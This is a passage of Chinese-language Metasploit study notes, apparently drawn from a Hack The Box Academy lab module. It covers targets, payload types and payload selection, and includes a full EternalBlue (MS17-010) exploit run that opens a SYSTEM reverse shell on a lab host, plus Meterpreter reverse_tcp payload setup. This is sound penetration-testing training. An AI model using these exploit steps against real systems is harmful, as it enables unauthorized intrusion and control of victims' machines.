   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

此外，还有 `setg` 选项，它将我们选择的选项指定为永久性的，直到程序重新启动。因此，如果我们正在针对特定的目标主机工作，我们可以使用此命令设置一次 IP 地址，在我们将注意力转移到不同的 IP 地址之前不再需要更改它。

#### MSF - 永久目标指定

MSF - Permanent Target Specification

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

一旦一切设置完毕并准备就绪，我们就可以继续发起攻击。请注意，这里没有设置 payload（载荷），因为默认的 payload 已足够用于此演示。

#### MSF - 漏洞利用执行

MSF - Exploit Execution

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter> shell

C:\Windows\system32>
```

我们现在在目标机器上有了一个 shell（命令行界面），可以与它进行交互。

#### MSF - 目标交互

MSF - Target Interaction

```shell-session
C:\Windows\system32> whoami

whoami
nt authority\system
```

这是一个关于 `msfconsole` 如何快速提供帮助的简单示例，同时也是框架如何工作的一个很好的例子。只需要一个模块，无需任何 `payload`（载荷）选择、`encoding`（编码）或在会话或任务之间进行 `pivoting`（跳板/枢纽攻击）。#metasploit #hacking [source](https://academy.hackthebox.com/module/39/section/408)

---

`Targets`（目标）是从特定操作系统版本中提取的唯一操作系统标识符，它使所选的漏洞利用模块适应在该特定版本的操作系统上运行。在漏洞利用模块视图中发出的 `show targets` 命令将显示该特定漏洞利用的所有可用易受攻击目标，而在根菜单中（在任何选定的漏洞利用模块之外）发出相同的命令将让我们知道需要首先选择一个漏洞利用模块。

#### MSF - 显示目标

MSF - Show Targets

```shell-session
msf6 > show targets

[-] No exploit module selected.
```

当查看我们之前的漏洞利用模块时，这是我们看到的内容：

MSF - Show Targets

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

---

## 选择目标

我们可以看到，这种类型的漏洞利用只设置了一种通用目标类型。如果我们将漏洞利用模块更改为需要更具体目标范围的模块会怎样？以下漏洞利用针对的是：

- `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`（MS12-063 微软 Internet Explorer execCommand 释放后使用漏洞）。

如果我们想了解更多关于这个特定模块以及其背后的漏洞的功能，我们可以使用 `info` 命令。每当我们不确定不同漏洞利用或辅助模块的来源或功能时，此命令可以帮助我们。请记住，审计我们的代码以查找任何产物生成或"附加功能"始终被认为是最佳实践，`info` 命令应该是我们使用新模块时采取的第一步之一。通过这种方式，我们可以熟悉漏洞利用功能，同时确保为客户和我们自己提供安全、干净的工作环境。

#### MSF - 目标选择

MSF - Target Selection

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch:
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Provided by:
  unknown
  eromang
  binjo
  sinn3r <sinn3r@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OBFUSCATE  false            no        Enable JavaScript obfuscation
  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object
  gets deleted in an unexpected manner, but the same memory is reused
  again later in the CMshtmlEd::Exec() function, leading to a
  use-after-free condition. Please note that this vulnerability has
  been exploited since Sep 14, 2012. Also, note that
  presently, this module has some target dependencies for the ROP
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9,
  JRE 1.6.x or below must be installed (which is often the case).

References:
  https://cvedetails.com/cve/CVE-2012-4969/
  OSVDB (85532)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
  http://technet.microsoft.com/en-us/security/advisory/2757760
  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
```

查看描述，我们可以大致了解这个漏洞利用将为我们实现什么。记住这一点后，我们接下来要检查哪些版本容易受到此漏洞利用的影响。

MSF - Target Selection

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:
```
   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

我们可以看到不同版本的 Internet Explorer 和各种 Windows 版本的选项。将选择保持为 `Automatic`（自动）会让 msfconsole 知道它需要在启动成功攻击之前对给定目标执行服务检测。

但是，如果我们知道目标上运行的是什么版本，可以使用 `set target <index no.>` 命令从列表中选择一个目标。

MSF - 目标选择

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

---

## 目标类型

目标类型种类繁多。每个目标可能因服务包、操作系统版本甚至语言版本而有所不同。这完全取决于目标或漏洞利用模块中的返回地址（return address）和其他参数。

返回地址可能会发生变化，因为特定的语言包会改变地址，或者有不同的软件版本可用，或者由于钩子（hooks）导致地址偏移。这完全由识别目标所需的返回地址类型决定。该地址可以是 `jmp esp`、跳转到标识目标的特定寄存器，或者是 `pop/pop/ret`。有关返回地址主题的更多信息，请参阅 [Stack-Based Buffer Overflows on Windows x86](https://academy.hackthebox.com/module/89/section/931) 模块。漏洞利用模块代码中的注释可以帮助我们确定目标是如何定义的。

要正确识别目标，我们需要：

- 获取目标二进制文件的副本
- 使用 msfpescan 定位合适的返回地址

在模块的后续部分，我们将更深入地探讨漏洞利用开发、载荷生成和目标识别。#metasploit #payload #hacking [source](https://academy.hackthebox.com/module/39/section/407)

---

Metasploit 中的 `Payload`（载荷）是指一个模块，它帮助漏洞利用模块（通常）向攻击者返回一个 shell。载荷与漏洞利用程序一起发送，以绕过易受攻击服务的标准功能流程（`漏洞利用的工作`），然后在目标操作系统上运行，通常向攻击者返回一个反向连接并建立立足点（`载荷的工作`）。

Metasploit Framework 中有三种不同类型的载荷模块：Singles（单一载荷）、Stagers（分阶段器）和 Stages（阶段载荷）。使用三种载荷交互类型将对渗透测试人员有益。它可以提供我们执行某些类型任务所需的灵活性。载荷是否为分阶段的由载荷名称中的 `/` 表示。

例如，`windows/shell_bind_tcp` 是一个没有阶段的单一载荷，而 `windows/shell/bind_tcp` 由一个分阶段器（`bind_tcp`）和一个阶段（`shell`）组成。

#### Singles（单一载荷）

`Single` 载荷包含漏洞利用程序和选定任务的完整 shellcode。内联载荷在设计上比其对应物更稳定，因为它们包含了所有内容。但是，某些漏洞利用程序可能不支持这些载荷的最终大小，因为它们可能变得相当大。`Singles` 是自包含的载荷。它们是发送到目标系统并在其上执行的唯一对象，在运行后立即得到结果。单一载荷可以简单到向目标系统添加用户或启动一个进程。

#### Stagers（分阶段器）

`Stager` 载荷与 Stage 载荷配合工作以执行特定任务。分阶段器在攻击者机器上等待，准备在阶段载荷在远程主机上完成运行后与受害主机建立连接。`Stagers` 通常用于在攻击者和受害者之间建立网络连接，并设计为小巧且可靠。Metasploit 将使用最佳的分阶段器，并在必要时回退到不太优选的分阶段器。

Windows NX vs. NO-NX 分阶段器

- NX CPU 和 DEP（数据执行保护）的可靠性问题
- NX 分阶段器更大（VirtualAlloc 内存）
- 默认现在是 NX + Win7 兼容

#### Stages（阶段载荷）

`Stages` 是由分阶段器模块下载的载荷组件。各种载荷阶段提供高级功能且无大小限制，例如 Meterpreter、VNC 注入等。载荷阶段自动使用中间分阶段器：

- 单个 `recv()` 对大型载荷会失败
- 分阶段器接收中间分阶段器
- 中间分阶段器然后执行完整下载
- 对 RWX（读写执行）也更好

---

## 分阶段载荷

分阶段载荷简单来说是一个`利用过程`，它是模块化的，功能上分离的，以帮助将其完成的不同功能隔离到不同的代码块中，每个代码块单独完成其目标，但协同工作以串联攻击。如果所有阶段都正常工作，这最终将授予攻击者对目标机器的远程访问权限。

此载荷的范围，与任何其他载荷一样，除了授予对目标系统的 shell 访问权限外，还要尽可能紧凑和不显眼，以尽可能帮助规避防病毒软件（`AV`）/入侵防御系统（`IPS`）。

分阶段载荷的 `Stage0` 代表通过网络发送到目标机器易受攻击服务的初始 shellcode，其唯一目的是初始化回连到攻击者机器的连接。这就是所谓的反向连接。作为 Metasploit 用户，我们会在常见名称 `reverse_tcp`、`reverse_https` 和 `bind_tcp` 下遇到这些。例如，在 `show payloads` 命令下，你可以查找如下所示的载荷：

#### MSF - 分阶段载荷

MSF - 分阶段载荷

```shell-session
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

反向连接不太可能触发预防系统，因为初始化连接的是受害主机，而受害主机大多数时候位于所谓的`安全信任区`中。然而，当然，网络的安全设备和人员不会盲目遵循这种信任策略，所以即使在这一步攻击者也必须小心谨慎。

Stage0 代码还旨在在更大的后续载荷到达时将其读入内存。在攻击者和受害者之间建立稳定的通信通道后，攻击者机器很可能会发送一个更大的载荷阶段，这应该授予他们 shell 访问权限。这个更大的载荷就是 `Stage1` 载荷。我们将在后面的章节中详细介绍。

#### Meterpreter 载荷

`Meterpreter` 载荷是一种特定类型的多功能载荷，它使用 `DLL 注入`来确保与受害主机的连接稳定、难以通过简单检查检测，并且在重启或系统更改后保持持久性。Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下痕迹，这使得使用传统取证技术非常难以检测。此外，脚本和插件可以根据需要`动态加载和卸载`。

一旦 Meterpreter 载荷执行，就会创建一个新会话，该会话会启动 Meterpreter 接口。它与 msfconsole 接口非常相似，但所有可用命令都针对载荷已"感染"的目标系统。它为我们提供了大量有用的命令，从击键捕获、密码哈希收集、麦克风窃听和屏幕截图到模拟进程安全令牌。我们将在后面的章节中更详细地介绍 Meterpreter。

使用 Meterpreter，我们还可以`加载`不同的插件来协助我们进行评估。我们将在本模块的插件部分详细讨论这些内容。

---

## 搜索载荷

要选择我们的第一个载荷，我们需要知道我们想在目标机器上做什么。例如，如果我们要进行访问持久化，我们可能想选择 Meterpreter 载荷。

如上所述，Meterpreter 载荷为我们提供了大量的灵活性。它们的基本功能已经非常广泛和强大。我们可以自动化并快速交付，结合像 [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) 这样的插件，可以自动化渗透测试的部分工作，同时保持有组织、高效的评估。要查看所有可用的载荷，请在 `msfconsole` 中使用 `show payloads` 命令。

#### MSF - 列出载荷

MSF - 列出载荷

```shell-session
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline

<SNIP>

   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

如上所示，有很多可用的载荷可供选择。不仅如此，我们还可以使用 `msfvenom` 创建自己的载荷，但我们稍后会深入讨论。我们将使用与之前相同的目标，而不是使用默认的简单 `reverse_tcp_shell` 载荷，我们将使用 `Windows 7(x64) 的 Meterpreter 载荷`。

滚动浏览上面的列表，我们找到包含 `Windows(x64) 的 Meterpreter 载荷` 的部分。

MSF - 列出载荷

```shell-session
   515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
```

正如我们所见，在这样一个庞大的列表中找到所需的载荷可能相当耗时。我们也可以在 `msfconsole` 中使用 `grep` 来过滤特定术语。这将加快搜索速度，从而加快我们的选择。

我们需要在开头输入 `grep` 命令及其相应参数，然后输入需要进行过滤的命令。例如，假设我们想要一个基于 `TCP` 的 `reverse shell`，由 `Meterpreter` 处理。相应地，我们可以首先搜索载荷中包含 `Meterpreter` 一词的所有结果。

#### MSF - 搜索特定载荷

MSF - 搜索特定载荷

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

这给我们总共 `14` 个结果。现在我们可以在第一个 `grep` 命令之后添加另一个 `grep` 命令并搜索 `reverse_tcp`。

MSF - 搜索特定载荷

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

借助 `grep`，我们将想要的载荷列表缩减到更少。当然，`grep` 命令可以用于所有其他命令。我们只需要知道我们在寻找什么。

---

## 选择载荷

与模块一样，我们需要想要使用的条目的索引号。要为当前选定的模块设置载荷，我们首先选择一个 Exploit 模块后使用 `set payload <no.>`。

#### MSF - 选择载荷

MSF - 选择载荷

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

